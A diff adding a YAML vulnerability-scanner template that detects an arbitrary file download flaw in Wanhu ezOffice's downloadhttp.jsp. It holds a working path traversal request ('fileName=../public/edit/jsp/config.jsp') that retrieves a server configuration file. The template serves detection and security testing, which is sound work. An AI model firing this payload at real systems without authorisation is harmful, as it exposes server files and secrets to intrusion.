@@ -1,0 +1,20 @@
+http:
+    - matchers:
+        - part: header
+          type: word
+          words:
+            - 'Content-Disposition: attachment; filename="../public/edit/jsp/config.jsp"'
+      method: GET
+      path:
+        - '{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp'
+      redirects: true
+      stop-at-first-match: true
+id: wanhu-ezoffice-downloadhttp-jsp-filedownload
+info:
+    author: sm
+    name: 万户ezoffice downloadhttp.jsp 任意文件下载
+    severity: critical
+    tags:
+        - wanhu
+        - filedownload
+        - ezoffice
